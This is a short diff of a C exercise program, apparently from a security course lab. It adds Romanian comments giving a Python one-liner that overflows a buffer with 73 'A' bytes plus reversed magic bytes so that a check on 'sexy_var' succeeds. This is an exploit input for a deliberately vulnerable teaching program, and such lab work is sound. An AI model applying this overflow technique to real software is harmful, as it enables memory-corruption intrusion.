@@ -20,6 +20,8 @@ int main(void)
 	/* Prevent in_between from being compiled out. */
 	in_between[3] = buffer[5];
 
+	// Comanda pentru ex 8 este:
+	// python -c "print(73*'A'+'\x55\x41\x49\x4d'[::-1])" | ./do_overflow
 	if (sexy_var == 0x5541494d)
 		printf("Full of win!\n");
 	else
